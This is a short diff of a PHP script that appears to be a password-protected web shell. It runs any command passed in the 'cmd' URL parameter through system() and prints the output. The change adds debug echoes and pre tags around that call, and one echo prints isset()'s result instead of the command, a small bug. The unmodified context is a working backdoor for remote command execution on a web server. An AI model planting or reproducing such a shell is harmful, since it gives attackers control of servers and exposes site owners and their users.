@@ -9,7 +9,10 @@
 
         if($key == $pwd){
             if(isset($_GET["cmd"])){
+                echo "exicuting ". isset($_GET["cmd"]);
+                echo "<pre>";
                 system($_GET["cmd"]);
+                echo "</pre>";
             }
         }
     }
